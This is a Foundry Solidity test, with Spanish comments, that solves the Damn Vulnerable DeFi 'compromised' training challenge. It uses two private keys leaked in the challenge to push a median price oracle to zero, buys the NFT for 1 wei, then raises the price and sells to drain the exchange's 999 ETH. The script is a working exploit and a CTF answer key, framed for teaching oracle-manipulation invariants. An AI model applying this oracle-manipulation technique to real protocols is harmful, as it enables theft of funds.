// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

/*
 * NEXUS Offensive · training/dvd · reto "compromised"
 *
 * CLASE DE BUG: oráculo de mediana con fuentes comprometidas. El precio es la
 *   mediana de 3 reporteros; dos claves privadas se filtraron (venían en la
 *   respuesta HTTP del reto, codificadas hex→base64). Con 2 de 3 fuentes se
 *   controla la mediana: se baja a 0 para comprar el NFT, se sube para venderlo
 *   y se vacía el exchange.
 *
 *   Las claves usadas son DATOS DEL PROPIO RETO (CTF), no secretos reales.
 *
 * FAMILIA: Oráculo / Precio (compromiso de fuentes).
 *
 * INVARIANTE QUE LO ATRAPA (refuerza la familia Oráculo):
 *   La mediana no debe poder sacarse de una banda del precio justo comprometiendo
 *   un subconjunto de fuentes por debajo del umbral bizantino. Se sostiene al
 *   inicio (mediana = 999 ETH, en banda) y se rompe cuando 2 fuentes la llevan a 0.
 */
contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    // Claves filtradas en el reto (decodificadas de la respuesta HTTP).
    uint256 constant LEAKED_KEY_0 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
    uint256 constant LEAKED_KEY_1 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    // SETS UP CHALLENGE - DO NOT TOUCH
    function setUp() public {
        startHoax(deployer);
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();
        vm.stopPrank();
    }

    /// @notice INVARIANTE (O2): la mediana está en una banda del precio justo.
    function _oracleInBand() internal view returns (bool) {
        uint256 m = oracle.getMedianPrice("DVNFT");
        return m >= INITIAL_NFT_PRICE / 2 && m <= INITIAL_NFT_PRICE * 2;
    }

    function test_compromised() public checkSolved {
        // Las 2 claves filtradas controlan 2 de las 3 fuentes.
        assertEq(vm.addr(LEAKED_KEY_0), sources[0], "la clave 0 controla la fuente 0");
        assertEq(vm.addr(LEAKED_KEY_1), sources[1], "la clave 1 controla la fuente 1");

        // La invariante se sostiene al inicio (mediana = 999 ETH).
        assertTrue(_oracleInBand(), "INV debe sostenerse al inicio");

        // Comprometer: bajar la mediana a 0 con las 2 fuentes.
        vm.prank(sources[0]);
        oracle.postPrice("DVNFT", 0);
        vm.prank(sources[1]);
        oracle.postPrice("DVNFT", 0);
        console.log("mediana tras comprometer 2 fuentes:", oracle.getMedianPrice("DVNFT"));
        assertFalse(_oracleInBand(), "INV rota: mediana fuera de banda por fuentes comprometidas");

        // Comprar barato (precio 0).
        vm.prank(player);
        uint256 id = exchange.buyOne{value: 1}();

        // Restaurar la mediana al valor del exchange para vender caro (y dejarla en 999).
        uint256 price = address(exchange).balance;
        vm.prank(sources[0]);
        oracle.postPrice("DVNFT", price);
        vm.prank(sources[1]);
        oracle.postPrice("DVNFT", price);

        // Vender caro y rescatar todo a recovery.
        vm.startPrank(player);
        nft.approve(address(exchange), id);
        exchange.sellOne(id);
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    // CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
    function _isSolved() private view {
        assertEq(address(exchange).balance, 0);
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);
        assertEq(nft.balanceOf(player), 0);
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
